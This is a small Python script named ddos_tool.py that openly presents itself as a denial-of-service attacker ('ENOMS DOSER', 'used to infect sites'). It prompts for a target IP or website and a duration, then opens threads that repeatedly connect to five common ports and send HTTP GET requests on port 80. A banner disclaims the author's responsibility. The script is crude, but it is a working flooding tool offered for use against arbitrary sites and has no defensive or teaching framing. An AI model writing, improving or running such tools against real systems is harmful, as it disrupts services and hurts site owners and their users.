# ddos_tool.py
import socket
import time
import os
import threading

ports = [80, 443, 8080, 21, 22]  # Common ports to target

def attack(target, port, duration):
    timeout = time.time() + duration * 60
    while time.time() &lt; timeout:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            s.connect((target, port))
            start = time.time()
            if port == 80:
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            s.recv(1024)
            end = time.time()
            ping = round((end - start) * 1000, 2)
            print(f"Successfully plagued {target}:{port}! 🤢🦠 | Ping: {ping}ms")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            s.close()
    print(f"Attack completed on {target}:{port}.")

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print ("WELCOME TO ENOMS DOSER")
    print ("this is plauge DDos attacker")
    print ("used to infect sites")
    print ("anything you do is not the owners fault")
    target = input("Enter the target IP or website: ")
    duration = int(input("Enter the duration in minutes: "))
    
    print(f"Starting attack on {target} for {duration} minutes. Press Ctrl+C to stop.")
    try:
        for port in ports:
            thread = threading.Thread(target=attack, args=(target, port, duration))
            thread.start()
    except KeyboardInterrupt:
        print("Attack stopped by user.")

if __name__ == "__main__":
    main()
